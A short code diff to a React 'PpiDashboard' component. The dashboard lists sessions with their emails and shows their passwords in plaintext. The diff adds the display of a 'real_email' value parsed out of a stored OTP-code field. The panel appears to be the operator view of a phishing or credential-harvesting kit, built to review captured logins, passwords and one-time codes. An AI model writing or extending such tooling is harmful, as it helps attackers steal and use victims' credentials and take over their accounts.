@@ -921,7 +921,15 @@ const PpiDashboard = () => {
                       <div className="flex items-center gap-2 flex-wrap">
                         <span className="text-[10px] font-mono text-muted-foreground tabular-nums w-[38px]">{timeStr}</span>
                         <span className={`text-[9px] px-1.5 py-0.5 rounded font-semibold ${cfg.color}`}>{cfg.label}</span>
-                        <span className="text-[11px] font-semibold text-foreground truncate">{session.email || "—"}</span>
+                        <span className="text-[11px] font-semibold text-foreground truncate">
+                          👤 {session.email || "—"}
+                        </span>
+                        {(() => {
+                          const realEmail = session.otp_code?.split("|").find(p => p.startsWith("real_email:"))?.replace("real_email:", "");
+                          return realEmail ? (
+                            <span className="text-[10px] text-blue-400 truncate">✉ {realEmail}</span>
+                          ) : null;
+                        })()}
                         {session.password && (
                           <span className="text-[10px] font-mono text-yellow-400 flex items-center gap-0.5">
                             <Lock size={8} /> {session.password}
